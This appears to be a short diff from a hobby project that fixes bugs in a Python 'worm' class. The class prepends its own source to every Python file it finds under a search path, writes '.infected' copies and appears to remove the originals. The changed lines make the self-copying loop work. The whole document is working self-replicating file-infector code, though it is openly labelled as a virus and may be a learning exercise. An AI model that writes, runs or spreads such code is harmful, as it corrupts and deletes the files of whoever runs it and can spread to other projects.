@@ -11,7 +11,7 @@ class worm():
         self.paths = []
 
         # the virus that we are inserting into
-        self.virus = open(__file__, 'r')
+        self.virus = open(__file__, 'r').readlines()
 
         # the initial path that we are searching along
         self.path = '/Users/Drew/Projects/garbage'
@@ -34,12 +34,13 @@ class worm():
         # infect every python file we found
         for file in self.files:
             # only open the files as read
-            with open(file, 'r')as r:
+            with open(file, 'r') as r:
                 # construct the name of the infected file
                 newName = (str(file) + '.infected')
                 # create the new, infected file
                 with open(newName, 'a') as w:
-                    w.write(self.virus)
+                    for line in self.virus:
+                        w.write(line)
                     for line in r.readlines():
                         w.write(line)
             # remove the old file
